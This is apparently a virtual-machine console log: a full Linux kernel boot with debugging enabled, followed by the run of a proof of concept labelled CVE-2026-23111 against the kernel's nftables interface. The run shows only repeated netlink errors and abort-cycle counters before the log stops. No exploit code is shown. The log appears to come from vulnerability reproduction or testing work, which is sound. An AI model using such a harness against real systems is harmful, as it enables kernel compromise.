c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 6.19.0-rc7-00131-g7d6ba706ae5e-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 10:18:23 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 295134089 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000004] tsc: Detected 3187.200 MHz processor
[    0.000313] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000331] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000334] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002287] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002294] Using GB pages for direct mapping
[    0.002379] RAMDISK: [mem 0x7fe91000-0x7ffdffff]
[    0.002383] ACPI: Early table checksum verification disabled
[    0.002385] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002388] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002392] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002396] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002398] ACPI: FACS 0x000000007FFE0000 000040
[    0.002400] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002402] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002403] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002405] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002406] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002406] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002407] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002408] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002408] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002592] No NUMA configuration found
[    0.002593] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002595] NODE_DATA(0) allocated [mem 0x7fe8d900-0x7fe90fff]
[    0.002603] Zone ranges:
[    0.002603]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002604]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002605]   Normal   empty
[    0.002606] Movable zone start for each node
[    0.002606] Early memory node ranges
[    0.002607]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002607]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002608] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.003449] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.003485] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.039653] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.272498] KernelAddressSanitizer initialized (generic)
[    0.272707] ACPI: PM-Timer IO Port: 0x608
[    0.272718] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.272746] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.272749] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.272750] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.272751] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.272752] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.272753] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.272755] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.272756] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.272758] TSC deadline timer available
[    0.272761] CPU topo: Max. logical packages:   1
[    0.272761] CPU topo: Max. logical dies:       1
[    0.272762] CPU topo: Max. dies per package:   1
[    0.272763] CPU topo: Max. threads per core:   1
[    0.272764] CPU topo: Num. cores per package:     2
[    0.272764] CPU topo: Num. threads per package:   2
[    0.272765] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.272777] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.272789] kvm-guest: KVM setup pv remote TLB flush
[    0.272791] kvm-guest: setup PV sched yield
[    0.272797] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.272799] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x000fffff]
[    0.272800] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.272801] Booting paravirtualized kernel on KVM
[    0.272803] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.280105] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.280991] percpu: Embedded 64 pages/cpu s223704 r8192 d30248 u1048576
[    0.281018] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.281055] random: crng init done
[    0.281056] printk: log buffer data + meta data: 262144 + 917504 = 1179648 bytes
[    0.282255] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.282303] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.282341] Fallback order for Node 0: 0 
[    0.282344] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.282344] Policy zone: DMA32
[    0.282345] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.282346] stackdepot: allocating hash table via alloc_large_system_hash
[    0.282347] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.294112] stackdepot: allocating space for 8192 stack pools via memblock
[    0.314295] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.315288] Dynamic Preempt: voluntary
[    0.316752] rcu: Preemptible hierarchical RCU implementation.
[    0.316754] rcu: 	RCU event tracing is enabled.
[    0.316754] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.316756] 	Trampoline variant of Tasks RCU enabled.
[    0.316756] 	Tracing variant of Tasks RCU enabled.
[    0.316757] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.316758] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.316780] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.316783] RCU Tasks Trace: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.325440] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.325668] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.328014] Console: colour VGA+ 80x25
[    0.328045] printk: legacy console [ttyS0] enabled
[    0.367608] ACPI: Core revision 20250807
[    0.367965] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.368529] APIC: Switch to symmetric I/O mode setup
[    0.369053] x2apic enabled
[    0.369363] APIC: Switched APIC routing to: physical x2apic
[    0.369799] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.370213] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.370854] kvm-guest: setup PV IPIs
[    0.371683] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.372045] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.372657] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.373203] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.373707] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.374012] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.374348] mitigations: Enabled attack vectors: user_kernel, user_user, SMT mitigations: auto
[    0.374655] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.375132] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.375653] ITS: Mitigation: Aligned branch/return thunks
[    0.375959] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.376439] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.376654] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.377133] active return thunk: its_return_thunk
[    0.377667] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.378118] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.378654] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.379023] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.379473] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.379655] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.380014] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.397031] Freeing SMP alternatives memory: 44K
[    0.397320] pid_max: default: 32768 minimum: 301
[    0.397661] SELinux:  Initializing.
[    0.398002] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.398433] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.399071] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.399653] Performance Events: unsupported CPU family 6 model 183 no PMU driver, software events only.
[    0.399674] signal: max sigframe size: 3632
[    0.399950] rcu: Hierarchical SRCU implementation.
[    0.400231] rcu: 	Max phase no-delay instances is 400.
[    0.400589] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.402730] smp: Bringing up secondary CPUs ...
[    0.403130] smpboot: x86: Booting SMP configuration:
[    0.403420] .... node  #0, CPUs:      #1
[    0.403665] smp: Brought up 1 node, 2 CPUs
[    0.404137] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.404721] Memory: 1682616K/2096632K available (45392K kernel code, 8149K rwdata, 10044K rodata, 5556K init, 1224K bss, 407008K reserved, 0K cma-reserved)
[    0.406710] devtmpfs: initialized
[    0.409016] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.409249] posixtimers hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.409658] futex hash table entries: 512 (32768 bytes on 1 NUMA nodes, total 32 KiB, linear).
[    0.410294] PM: RTC time: 10:21:17, date: 2026-05-05
[    0.410710] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.411273] audit: initializing netlink subsys (disabled)
[    0.411685] audit: type=2000 audit(1777976478.081:1): state=initialized audit_enabled=0 res=1
[    0.411887] thermal_sys: Registered thermal governor 'step_wise'
[    0.412666] cpuidle: using governor menu
[    0.413483] PCI: Using configuration type 1 for base access
[    0.413701] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.416714] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.417125] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.419925] ACPI: Added _OSI(Module Device)
[    0.420174] ACPI: Added _OSI(Processor Device)
[    0.420436] ACPI: Added _OSI(Processor Aggregator Device)
[    0.427058] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.429953] ACPI: Interpreter enabled
[    0.430209] ACPI: PM: (supports S0 S3 S4 S5)
[    0.430463] ACPI: Using IOAPIC for interrupt routing
[    0.430685] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.431218] PCI: Using E820 reservations for host bridge windows
[    0.431919] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.444553] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.444662] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.445115] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.445708] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.446514] PCI host bridge to bus 0000:00
[    0.446678] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.447075] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.447470] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.447655] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.448090] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.448537] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.448684] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    0.453382] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    0.457814] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    0.458650] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    0.458673] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    0.459068] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    0.459427] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    0.459657] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    0.460165] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    0.460832] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.461254] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.461814] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    0.462929] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    0.463314] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    0.463670] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    0.464082] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.468604] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    0.469209] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    0.469586] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    0.469674] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    0.475436] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.476043] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.477001] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.477731] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.478240] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.479809] iommu: Default domain type: Translated
[    0.480102] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.480761] SCSI subsystem initialized
[    0.481133] ACPI: bus type USB registered
[    0.481426] usbcore: registered new interface driver usbfs
[    0.481676] usbcore: registered new interface driver hub
[    0.481999] usbcore: registered new device driver usb
[    0.482334] pps_core: LinuxPPS API ver. 1 registered
[    0.482634] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.482661] PTP clock support registered
[    0.483038] Advanced Linux Sound Architecture Driver Initialized.
[    0.483754] NetLabel: Initializing
[    0.483962] NetLabel:  domain hash size = 128
[    0.484218] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.484582] NetLabel:  unlabeled traffic allowed by default
[    0.484692] PCI: Using ACPI for IRQ routing
[    0.485020] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.485024] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.485357] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.485655] vgaarb: loaded
[    0.485877] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.486164] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.489703] clocksource: Switched to clocksource kvm-clock
[    0.490263] VFS: Disk quotas dquot_6.6.0
[    0.490503] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.491810] pnp: PnP ACPI init
[    0.493111] pnp: PnP ACPI: found 6 devices
[    0.501591] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.502155] NET: Registered PF_INET protocol family
[    0.502482] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.503334] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.503842] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.504305] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.504780] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.506347] TCP: Hash tables configured (established 16384 bind 16384)
[    0.506768] UDP hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.507164] UDP-Lite hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.507648] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.508205] RPC: Registered named UNIX socket transport module.
[    0.508549] RPC: Registered udp transport module.
[    0.508826] RPC: Registered tcp transport module.
[    0.509105] RPC: Registered tcp-with-tls transport module.
[    0.509422] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.510167] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.510527] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.510899] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.511315] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.511730] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.512243] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.512584] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.512960] PCI: CLS 0 bytes, default 64
[    0.513257] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.513364] Unpacking initramfs...
[    0.513752] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.515998] Initialise system trusted keyrings
[    0.516323] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.517124] NFS: Registering the id_resolver key type
[    0.517425] Key type id_resolver registered
[    0.517672] Key type id_legacy registered
[    0.517963] 9p: Installing v9fs 9p2000 file system support
[    0.524878] Key type asymmetric registered
[    0.525151] Asymmetric key parser 'x509' registered
[    0.525467] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.525915] io scheduler mq-deadline registered
[    0.526191] io scheduler kyber registered
[    0.526700] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.527265] ACPI: button: Power Button [PWRF]
[    0.528112] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.528686] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.528927] Freeing initrd memory: 1340K
[    0.532063] Non-volatile memory driver v1.3
[    0.532314] Linux agpgart interface v0.103
[    0.535250] loop: module loaded
[    0.537990] scsi host0: ata_piix
[    0.538411] scsi host1: ata_piix
[    0.538698] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    0.539173] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    0.540413] e100: Intel(R) PRO/100 Network Driver
[    0.540700] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.541044] e1000: Intel(R) PRO/1000 Network Driver
[    0.541330] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.696318] ata2: found unknown device (class 0)
[    0.697952] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.700290] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.716296] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.716698] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.724017] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.884498] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.170480] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.170904] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.171366] e1000e: Intel(R) PRO/1000 Network Driver
[    1.171666] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.172054] sky2: driver version 1.30
[    1.172598] usbcore: registered new interface driver usblp
[    1.172950] usbcore: registered new interface driver usb-storage
[    1.173364] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.174304] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.174610] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.175139] rtc_cmos 00:05: RTC can wake from S4
[    1.176814] rtc_cmos 00:05: registered as rtc0
[    1.177157] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.177873] device-mapper: ioctl: 4.50.0-ioctl (2025-04-28) initialised: dm-devel@lists.linux.dev
[    1.178412] intel_pstate: CPU model not supported
[    1.178725] hid: raw HID events driver (C) Jiri Kosina
[    1.179445] usbcore: registered new interface driver usbhid
[    1.179776] usbhid: USB HID core driver
[    1.181728] Initializing XFRM netlink socket
[    1.182041] NET: Registered PF_INET6 protocol family
[    1.182758] Segment Routing with IPv6
[    1.183005] In-situ OAM (IOAM) with IPv6
[    1.183279] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.183874] NET: Registered PF_PACKET protocol family
[    1.184224] 9pnet: Installing 9P2000 support
[    1.184501] Key type dns_resolver registered
[    1.185010] IPI shorthand broadcast: enabled
[    1.192893] sched_clock: Marking stable (1149001020, 42979014)->(1202335426, -10355392)
[    1.193611] registered taskstats version 1
[    1.193858] Loading compiled-in X.509 certificates
[    1.201977] Demotion targets for Node 0: null
[    1.202356] PM:   Magic number: 10:251:375
[    1.202635] netconsole: network logging started
[    1.203067] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.203838] kworker/u8:2 (58) used greatest stack depth: 29584 bytes left
[    1.204318] kworker/u8:2 (59) used greatest stack depth: 29536 bytes left
[    1.204913] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.205372] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.205805] ALSA device list:
[    1.205985]   No soundcards found.
[    1.207020] Freeing unused kernel image (initmem) memory: 5556K
[    1.207312] faux_driver regulatory: Direct firmware load for regulatory.db failed with error -2
[    1.207656] cfg80211: failed to load regulatory.db
[    1.207871] Write protecting the kernel read-only data: 57344k
[    1.208486] Freeing unused kernel image (text/rodata gap) memory: 1708K
[    1.208804] Freeing unused kernel image (rodata/data gap) memory: 196K
[    1.218931] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.219239] Run /init as init process
[    1.220051] mkdir (61) used greatest stack depth: 28344 bytes left
[    1.222509] mount (62) used greatest stack depth: 27888 bytes left
[    1.223199] mount (63) used greatest stack depth: 27864 bytes left
[    1.228833] busybox (67) used greatest stack depth: 27152 bytes left

secb: rootfs ready
---- poc begin ----
poc: CVE-2026-23111 start
poc: setup errs=0
[nftnl] NLERR seq=12 err=2 (No such file or directory)
poc: abort cycle r=0
[nftnl] NLERR seq=17 err=2 (No such file or directory)
[nftnl] NLERR seq=22 err=2 (No such file or directory)
[nftnl] NLERR seq=27 err=2 (No such file or directory)
[nftnl] NLERR seq=32 err=2 (No such file or directory)
[nftnl] NLERR seq=37 err=2 (No such file or directory)
[nftnl] NLERR seq=42 err=2 (No such file or directory)
[nftnl] NLERR seq=47 err=2 (No such file or directory)
[nftnl] NLERR seq=52 err=2 (No such file or directory)
[nftnl] NLERR seq=57 err=2 (No such file or directory)
[nftnl] NLERR seq=62 err=2 (No such file or directory)
[nftnl] NLERR seq=67 err=2 (No such file or directory)
[nftnl] NLERR seq=72 err=2 (No such file or directory)
[nftnl] NLERR seq=77 err=2 (No such file or directory)
[nftnl] NLERR seq=82 err=2 (No such file or directory)
[nftnl] NLERR seq=87 err=2 (No such file or directory)
[nftnl] NLERR seq=92 err=2 (No such file or directory)
[nftnl] NLERR seq=97 err=2 (No such file or directory)
[nftnl] NLERR seq=102 err=2 (No such file or directory)
[nftnl] NLERR seq=107 err=2 (No such file or directory)
[nftnl] NLERR seq=112 err=2 (No such file or directory)
[nftnl] NLERR seq=117 err=2 (No such file or directory)
[nftnl] NLERR seq=122 err=2 (No such file or directory)
[nftnl] NLERR seq=127 err=2 (No such file or directory)
[nftnl] NLERR seq=132 err=2 (No such file or directory)
[nftnl] NLERR seq=137 err=2 (No such file or directory)
[nftnl] NLERR seq=142 err=2 (No such file or directory)
[nftnl] NLERR seq=147 err=2 (No such file or directory)
[nftnl] NLERR seq=152 err=2 (No such file or directory)
[nftnl] NLERR seq=157 err=2 (No such file or directory)
[nftnl] NLERR seq=162 err=2 (No such file or directory)
[nftnl] NLERR seq=167 err=2 (No such file or directory)
[nftnl] NLERR seq=172 err=2 (No such file or directory)
poc: abort cycle r=32
[nftnl] NLERR seq=177 err=2 (No such file or directory)
[nftnl] NLERR seq=182 err=2 (No such file or directory)
[nftnl] NLERR seq=187 err=2 (No such file or directory)
[nftnl] NLERR seq=192 err=2 (No such file or directory)
[nftnl] NLERR seq=197 err=2 (No such file or directory)
[nftnl] NLERR seq=202 err=2 (No such file or directory)
[nftnl] NLERR seq=207 err=2 (No such file or directory)
[nftnl] NLERR seq=212 err=2 (No such file or directory)
[nftnl] NLERR seq=217 err=2 (No such file or directory)
[nftnl] NLERR seq=222 err=2 (No such file or directory)
[nftnl] NLERR seq=227 err=2 (No such file or directory)
[nftnl] NLERR seq=232 err=2 (No such file or directory)
[nftnl] NLERR seq=237 err=2 (No such file or directory)
[nftnl] NLERR seq=242 err=2 (No such file or directory)
[nftnl] NLERR seq=247 err=2 (No such file or directory)
[nftnl] NLERR seq=252 err=2 (No such file or directory)
[nftnl] NLERR seq=257 err=2 (No such file or directory)
[nftnl] NLERR seq=262 err=2 (No such file or directory)
[nftnl] NLERR seq=267 err=2 (No such file or directory)
[nftnl] NLERR seq=272 err=2 (No such file or directory)
[nftnl] NLERR seq=277 err=2 (No such file or directory)
[nftnl] NLERR seq=282 err=2 (No such file or directory)
[nftnl] NLERR seq=287 err=2 (No such file or directory)
[nftnl] NLERR seq=292 err=2 (No such file or directory)
[nftnl] NLERR seq=297 err=2 (No such file or directory)
[nftnl] NLERR seq=302 err=2 (No such file or directory)
[nftnl] NLERR seq=307 err=2 (No such file or directory)
[nftnl] NLERR seq=312 err=2 (No such file or directory)
[nftnl] NLERR seq=317 err=2 (No such file or directory)
[nftnl] NLERR seq=322 err=2 (No such file or directory)
[nftnl] NLERR seq=327 err=2 (No such file or directory)
[nftnl] NLERR seq=332 err=2 (No such file or directory)
poc: abort cycle r=64
[nftnl] NLERR seq=337 err=2 (No such file or directory)
[nftnl] NLERR seq=342 err=2 (No such file or directory)
[nftnl] NLERR seq=347 err=2 (No such file or directory)
